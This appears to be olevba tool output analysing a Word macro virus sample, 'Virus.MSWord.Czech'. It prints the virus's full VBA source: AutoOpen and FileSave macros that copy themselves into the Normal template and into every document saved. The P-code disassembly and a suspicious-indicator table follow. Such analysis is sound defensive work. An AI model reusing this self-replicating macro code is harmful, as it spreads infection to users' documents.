olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Czech
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Czech - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Czech - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Uloží aktivní dokument nebo šablonu."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
  Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
  On Error GoTo -1: On Error GoTo ErrorHandler
  WordBasic.FileSave
  WordBasic.CurValues.FileSaveAs dlg
  If dlg.Format = 0 Then
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
    WordBasic.MacroCopy "normal:AutoOpen", dlg.Name + ":AutoOpen"
    WordBasic.MacroCopy "normal:FileSave", dlg.Name + ":FileSave"
  End If
ErrorHandler:
  Select Case Err.Number
    Case 102    'Input box was canceled
    Case Else   'Any other error condition
      Error Err.Number
  End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Czech - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
  Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
  WordBasic.CurValues.FileSummaryInfo dlg
  WordBasic.MacroCopy dlg.FileName + ":AutoOpen", "normal:AutoOpen"
  WordBasic.MacroCopy dlg.FileName + ":FileSave", "normal:FileSave"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Czech
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSave - 2092 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #3:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ErrorHandler 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #5:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #6:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	LitStr 0x000F "normal:AutoOpen"
' 	Ld dlg 
' 	MemLd New 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' 	LitStr 0x000F "normal:FileSave"
' 	Ld dlg 
' 	MemLd New 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Label ErrorHandler 
' Line #13:
' 	Ld Err 
' 	MemLd Number 
' 	SelectCase 
' Line #14:
' 	LitDI2 0x0066 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0010 0x0016 "Input box was canceled"
' Line #15:
' 	CaseElse 
' 	QuoteRem 0x0010 0x0019 "Any other error condition"
' Line #16:
' 	Ld Err 
' 	MemLd Number 
' 	Error 
' Line #17:
' 	EndSelect 
' Line #18:
' 	EndSub 
' Macros/VBA/AutoOpen - 1219 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSummaryInfo 0x0001 
' 	Set dlg 
' Line #3:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #4:
' 	Ld dlg 
' 	MemLd FileName 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "normal:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #5:
' 	Ld dlg 
' 	MemLd FileName 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x000F "normal:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #6:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

